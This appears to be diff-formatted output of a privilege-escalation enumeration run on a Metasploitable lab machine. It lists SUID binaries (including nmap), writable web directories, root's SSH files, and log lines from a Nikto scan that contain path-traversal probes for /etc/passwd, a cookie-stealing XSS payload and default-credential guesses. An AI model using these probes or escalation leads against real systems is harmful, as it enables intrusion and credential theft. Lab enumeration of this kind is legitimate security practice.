+    drwxr-xr-x 2 root root 4.0K 2012-05-20 14:46 .
+    drwxr-xr-x 5 root root 4.0K 2026-11-22 19:10 ..
+    /root/.fluxbox/styles:
+    total 8.0K
+    drwxr-xr-x 2 root root 4.0K 2012-05-20 14:46 .
+    drwxr-xr-x 5 root root 4.0K 2026-11-22 19:10 ..
+    /root/.gstreamer-0.10:
+    total 16K
+    drwxr-xr-x  2 root root 4.0K 2012-05-20 15:09 .
+    drwxr-xr-x 14 root root 4.0K 2026-11-22 19:10 ..
+    -rw-------  1 root root 7.4K 2012-05-20 15:09 registry.i486.xml
+    /root/.ssh:
+    total 16K
+    drwxr-xr-x  2 root root 4.0K 2012-05-20 14:21 .
+    drwxr-xr-x 14 root root 4.0K 2026-11-22 19:10 ..
+    -rw-r--r--  1 root root  405 2010-05-17 21:44 authorized_keys
+    -rw-r--r--  1 root root  442 2012-05-20 14:21 known_hosts
+
+[+] SUID/SGID Files and Directories
+    -rwsr-xr-x 1 root root 63584 2008-04-14 23:36 /bin/umount
+    -rwsr-xr-- 1 root fuse 20056 2008-02-26 13:25 /bin/fusermount
+    -rwsr-xr-x 1 root root 25540 2008-04-02 21:08 /bin/su
+    -rwsr-xr-x 1 root root 81368 2008-04-14 23:36 /bin/mount
+    -rwsr-xr-x 1 root root 30856 2007-12-10 12:33 /bin/ping
+    -rwsr-xr-x 1 root root 26684 2007-12-10 12:33 /bin/ping6
+    -rwsr-xr-x 1 root root 65520 2008-12-02 14:31 /sbin/mount.nfs
+    -rwxr-sr-x 1 root shadow 19584 2008-04-09 16:26 /sbin/unix_chkpwd
+    -rwsr-xr-- 1 root dhcp 2960 2008-04-02 09:38 /lib/dhcp3-client/call-dhclient-script
+    drwxrwsr-x 2 root src 4096 2008-04-15 01:53 /usr/src
+    -rwsr-xr-x 2 root root 107776 2008-02-25 06:22 /usr/bin/sudoedit
+    -rwxr-sr-x 1 root utmp 3192 2008-04-22 18:22 /usr/bin/Eterm
+    -rwsr-sr-x 1 root root 7460 2008-06-25 16:53 /usr/bin/X
+    -rwxr-sr-x 1 root tty 8192 2007-12-12 08:59 /usr/bin/bsd-write
+    -rwsr-xr-x 1 root root 8524 2007-11-22 07:14 /usr/bin/netkit-rsh
+    -rwxr-sr-x 1 root ssh 76580 2008-04-06 07:50 /usr/bin/ssh-agent
+    -rwsr-xr-x 1 root root 37360 2008-04-02 21:08 /usr/bin/gpasswd
+    -rwxr-sr-x 1 root mlocate 30508 2008-03-08 13:22 /usr/bin/mlocate
+    -rwxr-sr-x 1 root crontab 26928 2008-04-08 14:02 /usr/bin/crontab
+    -rwsr-xr-x 1 root root 12296 2007-12-10 12:33 /usr/bin/traceroute6.iputils
+    -rwsr-xr-x 2 root root 107776 2008-02-25 06:22 /usr/bin/sudo
+    -rwsr-xr-x 1 root root 12020 2007-11-22 07:14 /usr/bin/netkit-rlogin
+    -rwxr-sr-x 1 root shadow 37904 2008-04-02 21:08 /usr/bin/chage
+    -rwxr-sr-x 1 root utmp 308228 2007-10-23 12:02 /usr/bin/screen
+    -rwxr-sr-x 1 root shadow 16424 2008-04-02 21:08 /usr/bin/expiry
+    -rwsr-xr-x 1 root root 11048 2007-12-10 12:33 /usr/bin/arping
+    -rwsr-sr-x 1 daemon daemon 38464 2007-02-20 08:41 /usr/bin/at
+    -rwxr-sr-x 1 root utmp 306996 2009-01-02 16:45 /usr/bin/xterm
+    -rwsr-xr-x 1 root root 19144 2008-04-02 21:08 /usr/bin/newgrp
+    -rwxr-sr-x 1 root tty 9960 2008-04-14 23:36 /usr/bin/wall
+    -rwsr-xr-x 1 root root 28624 2008-04-02 21:08 /usr/bin/chfn
+    -rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
+    -rwsr-xr-x 1 root root 23952 2008-04-02 21:08 /usr/bin/chsh
+    -rwsr-xr-x 1 root root 15952 2007-11-22 07:14 /usr/bin/netkit-rcp
+    -rwsr-xr-x 1 root root 29104 2008-04-02 21:08 /usr/bin/passwd
+    -rwsr-xr-x 1 root root 46084 2008-03-31 00:32 /usr/bin/mtr
+    -rwsr-sr-x 1 libuuid libuuid 12336 2008-03-27 13:25 /usr/sbin/uuidd
+    -r-xr-sr-x 1 root postdrop 10312 2008-04-18 13:42 /usr/sbin/postqueue
+    -r-xr-sr-x 1 root postdrop 10036 2008-04-18 13:42 /usr/sbin/postdrop
+    -rwsr-xr-- 1 root dip 269256 2007-10-04 15:57 /usr/sbin/pppd
+    drwxrwsr-x 2 root staff 4096 2010-03-23 17:54 /usr/local/share/fonts
+    drwxrwsr-x 7 root staff 4096 2010-03-23 17:57 /usr/local/share/sgml
+    drwxrwsr-x 2 root staff 4096 2010-03-23 17:57 /usr/local/share/sgml/stylesheet
+    drwxrwsr-x 2 root staff 4096 2010-03-23 17:57 /usr/local/share/sgml/declaration
+    drwxrwsr-x 2 root staff 4096 2010-03-23 17:57 /usr/local/share/sgml/dtd
+    drwxrwsr-x 2 root staff 4096 2010-03-23 17:57 /usr/local/share/sgml/entities
+    drwxrwsr-x 2 root staff 4096 2010-03-23 17:57 /usr/local/share/sgml/misc
+    drwxrwsr-x 2 root staff 4096 2010-04-17 02:35 /usr/local/lib/site_ruby/1.8/i486-linux
+    drwxrwsr-x 3 root staff 4096 2010-04-28 00:45 /usr/local/lib/python2.5
+    drwxrwsr-x 2 root staff 4096 2010-04-28 00:45 /usr/local/lib/python2.5/site-packages
+    -rwsr-xr-- 1 root telnetd 6040 2006-12-17 21:16 /usr/lib/telnetlogin
+    -rwsr-xr-- 1 root www-data 10276 2010-03-09 15:52 /usr/lib/apache2/suexec
+    -rwsr-xr-x 1 root root 4524 2007-11-05 15:48 /usr/lib/eject/dmcrypt-get-device
+    -rwsr-xr-x 1 root root 165748 2008-04-06 07:50 /usr/lib/openssh/ssh-keysign
+    -rwsr-xr-x 1 root root 9624 2009-08-17 21:04 /usr/lib/pt_chown
+    drwxr-s--- 2 root dip 4096 2010-03-16 19:11 /etc/chatscripts
+    drwxr-s--- 2 root dip 4096 2010-03-16 19:11 /etc/ppp/peers
+    drwxr-sr-x 2 root bind 4096 2010-03-17 10:19 /etc/bind
+    drwxrwsr-x 2 postgres postgres 100 2026-11-22 19:10 /var/run/postgresql
+    drwxrwsr-x 2 root mail 4096 2010-05-07 14:36 /var/mail
+    drwxr-s--- 2 mysql adm 4096 2010-03-17 10:09 /var/log/mysql
+    drwxr-sr-x 2 news news 4096 2010-03-16 19:15 /var/log/news
+    drwxrwsr-x 2 root staff 4096 2008-04-15 01:53 /var/local
+    drwxr-sr-x 44 man root 4096 2010-05-08 06:33 /var/cache/man
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/ru.KOI8-R
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/zh_CN
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/fi
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/ko
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/id
+    drwxr-sr-x 2 man root 4096 2010-03-17 06:51 /var/cache/man/cat5
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/pt_BR
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/local
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/hu
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/de
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/ru.UTF-8
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/pt
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/tr
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/fr.UTF-8
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/ru
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/cs
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/pl.UTF-8
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/pl
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/ja
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/es
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/sv
+    drwxr-sr-x 2 man root 4096 2010-03-17 06:51 /var/cache/man/cat3
+    drwxr-sr-x 2 man root 4096 2010-03-17 06:51 /var/cache/man/cat7
+    drwxr-sr-x 2 man root 4096 2010-03-17 06:51 /var/cache/man/cat6
+    drwxr-sr-x 2 man root 4096 2010-03-17 06:51 /var/cache/man/cat1
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/zh_TW
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/it.ISO8859-1
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/it
+    drwxr-sr-x 2 man root 4096 2010-03-17 06:51 /var/cache/man/X11R6
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/vi
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/fr
+    drwxr-sr-x 2 man root 4096 2010-03-17 06:51 /var/cache/man/cat8
+    drwxr-sr-x 2 man root 4096 2010-03-17 06:51 /var/cache/man/opt
+    drwxr-sr-x 2 man root 4096 2010-03-17 06:51 /var/cache/man/fsstnd
+    drwxr-sr-x 2 man root 4096 2010-03-17 06:51 /var/cache/man/cat4
+    drwxr-sr-x 2 man root 4096 2010-03-17 06:51 /var/cache/man/cat2
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/gl
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/pl.ISO8859-2
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/fr.ISO8859-1
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/nl
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/it.UTF-8
+    drwxr-sr-x 2 man root 4096 2010-05-08 06:33 /var/cache/man/oldlocal
+    drwxrwsr-x 2 libuuid libuuid 4096 2010-03-16 18:59 /var/lib/libuuid
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/dump
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/modules/cache
+    drwxrwsr-x 29 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/tiki
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/jalist
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/boreal
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/smartiki
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/dblue
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/transitions
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/brtiki
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/geo
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/slides
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/lesjetesdelencre
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/subsilver
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/simple
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/tranquil
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/jalist2
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/BiDi
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/mozilla
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/neat
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/hec
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/integrator
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/gemsi
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/mose
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/lite
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/fmsc
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/default
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/notheme
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/codex
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/styles/slideshows
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/files
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/whelp
+    drwxrwsr-x 2 www-data www-data 4096 2010-04-16 02:17 /var/www/tikiwiki-old/maps
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/lib/Galaxia/processes
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/backups
+    drwxrwsr-x 2 www-data www-data 4096 2010-04-16 02:17 /var/www/tikiwiki-old/mods
+    drwxrwsr-x 4 www-data www-data 4096 2010-04-16 02:37 /var/www/tikiwiki-old/db
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/db/oracle
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/db/profiles
+    drwxrwsr-x 4 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/temp
+    drwxrwsr-x 2 www-data www-data 4096 2010-04-19 19:38 /var/www/tikiwiki-old/temp/cache
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/temp/mail_attachs
+    drwxrwsr-x 2 www-data www-data 4096 2010-04-19 19:38 /var/www/tikiwiki-old/templates_c
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/img/wiki
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/img/trackers
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/img/wiki_up
+    drwxrwsr-x 9 www-data www-data 20480 2008-04-08 20:45 /var/www/tikiwiki-old/templates
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/modules
+    drwxrwsr-x 17 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles
+    drwxrwsr-x 3 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/tiki
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/tiki/modules
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/smartiki
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/brtiki
+    drwxrwsr-x 3 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/geo
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/geo/modules
+    drwxrwsr-x 3 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/simple
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/simple/modules
+    drwxrwsr-x 3 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/neat
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/neat/modules
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/trollparty
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/damian
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/tikigod
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/gemsi
+    drwxrwsr-x 3 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/mose
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/mose/modules
+    drwxrwsr-x 3 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/moreneat
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/moreneat/modules
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/blank
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/notheme
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/styles/codex
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/mail
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/tables
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/debug
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/wiki-plugins
+    drwxrwsr-x 2 www-data www-data 4096 2008-04-08 20:45 /var/www/tikiwiki-old/templates/map
+    drwx--s--- 2 postfix postdrop 4096 2026-11-22 19:10 /var/spool/postfix/public
+
+[+] Logs containing keyword 'password'
+    /var/log/daemon.log:Nov  7 23:22:34 metasploitable /etc/mysql/debian-start[4662]: WARNING: mysql.user contains 1 root accounts without password!
+    /var/log/daemon.log:Nov  7 23:28:49 metasploitable /etc/mysql/debian-start[4314]: WARNING: mysql.user contains 1 root accounts without password!
+    /var/log/daemon.log:Nov 21 21:18:02 metasploitable /etc/mysql/debian-start[4273]: WARNING: mysql.user contains 1 root accounts without password!
+    /var/log/daemon.log:Nov 22 19:10:08 metasploitable /etc/mysql/debian-start[4262]: WARNING: mysql.user contains 1 root accounts without password!
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:09 2026] [error] [client 192.168.1.105] File does not exist: /var/www/pZ6gBZPv.password
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:10 2026] [error] [client 192.168.1.105] File does not exist: /var/www/pZ6gBZPv.pwd
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:11 2026] [error] [client 192.168.1.105] File does not exist: /var/www/password.inc
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:17 2026] [error] [client 192.168.1.105] script not found or unable to stat: /usr/lib/cgi-bin/retrieve_password.pl
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:20 2026] [error] [client 192.168.1.105] File does not exist: /var/www/forgot_password.php
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:22 2026] [error] [client 192.168.1.105] File does not exist: /var/www/iisadmpwd
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:22 2026] [error] [client 192.168.1.105] File does not exist: /var/www/iisadmpwd
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:22 2026] [error] [client 192.168.1.105] File does not exist: /var/www/iisadmpwd
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:22 2026] [error] [client 192.168.1.105] File does not exist: /var/www/iisadmpwd
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:22 2026] [error] [client 192.168.1.105] File does not exist: /var/www/iisadmpwd
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:23 2026] [error] [client 192.168.1.105] File does not exist: /var/www/master.password
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:23 2026] [error] [client 192.168.1.105] File does not exist: /var/www/password
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:23 2026] [error] [client 192.168.1.105] File does not exist: /var/www/password
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:23 2026] [error] [client 192.168.1.105] File does not exist: /var/www/passwords.txt
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:23 2026] [error] [client 192.168.1.105] File does not exist: /var/www/passwords
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:24 2026] [error] [client 192.168.1.105] File does not exist: /var/www/pwd.db
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:24 2026] [error] [client 192.168.1.105] File does not exist: /var/www/spwd
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:24 2026] [error] [client 192.168.1.105] script not found or unable to stat: /usr/lib/cgi-bin/password
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:27 2026] [error] [client 192.168.1.105] script not found or unable to stat: /usr/lib/cgi-bin/change-your-password.pl
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:31 2026] [error] [client 192.168.1.105] File does not exist: /var/www/banmat.pwd
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:31 2026] [error] [client 192.168.1.105] File does not exist: /var/www/iisadmpwd
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:32 2026] [error] [client 192.168.1.105] File does not exist: /var/www/iisadmpwd
+    /var/log/apache2/error.log:[Sun Nov 22 19:20:46 2026] [error] [client 192.168.1.105] File does not exist: /var/www/ezusermanager_pwd_forgott.php
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:09 -0500] "GET /pZ6gBZPv.password HTTP/1.1" 404 299 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:10 -0500] "GET /pZ6gBZPv.pwd HTTP/1.1" 404 294 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:11 -0500] "GET /guestbook/pwd HTTP/1.1" 404 295 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000044)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:11 -0500] "GET /password.inc HTTP/1.1" 404 294 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000163)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:14 -0500] "GET /goform/CheckLogin?login=root&password=tslinux HTTP/1.1" 404 299 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000505)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:15 -0500] "GET /cgi-bin/sojourn.cgi?cat=../../../../../../../../../../etc/password%00 HTTP/1.1" 404 301 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000647)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:17 -0500] "GET /cgi-bin/probecontrol.cgi?command=enable&username=cancer&password=killer HTTP/1.1" 404 306 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000939)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:17 -0500] "GET /cgi-bin/probecontrol.cgi?command=enable&userNikto=cancer&password=killer HTTP/1.1" 404 306 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000939)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:17 -0500] "GET /cgi-bin/retrieve_password.pl HTTP/1.1" 404 310 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000940)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:18 -0500] "GET /chat/!pwds.txt HTTP/1.1" 404 296 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000993)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:18 -0500] "GET /admin/login.php?action=insert&username=test&password=test HTTP/1.1" 404 297 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001086)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:19 -0500] "GET /pvote/ch_info.php?newpass=password&confirm=password%20 HTTP/1.1" 404 299 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001175)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:19 -0500] "GET /thebox/admin.php?act=write&username=admin&password=admin&aduser=admin&adpass=admin HTTP/1.1" 404 298 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001179)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:20 -0500] "GET /level/16/exec/-///pwd HTTP/1.1" 404 303 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001253)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:20 -0500] "GET /basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=sec&password=secu HTTP/1.1" 404 294 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001354)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:20 -0500] "GET /forgot_password.php?email=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 404 301 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001379)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:20 -0500] "GET /bugs/forgot_password.php?email=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 404 306 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001381)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:20 -0500] "GET /eventum/forgot_password.php?email=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 404 309 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001383)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:22 -0500] "GET /iisadmpwd/aexp2.htr HTTP/1.1" 404 301 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001492)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:22 -0500] "GET /iisadmpwd/aexp2b.htr HTTP/1.1" 404 302 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001493)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:22 -0500] "GET /iisadmpwd/aexp3.htr HTTP/1.1" 404 301 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001494)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:22 -0500] "GET /iisadmpwd/aexp4.htr HTTP/1.1" 404 301 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001495)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:22 -0500] "GET /iisadmpwd/aexp4b.htr HTTP/1.1" 404 302 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001496)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:23 -0500] "GET /master.password HTTP/1.1" 404 297 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001745)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:23 -0500] "GET /password HTTP/1.1" 404 290 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001787)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:23 -0500] "GET /password/ HTTP/1.1" 404 291 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001788)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:23 -0500] "GET /passwords.txt HTTP/1.1" 404 295 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001789)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:23 -0500] "GET /passwords/ HTTP/1.1" 404 292 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001790)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:24 -0500] "GET /pwd.db HTTP/1.1" 404 288 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001818)"
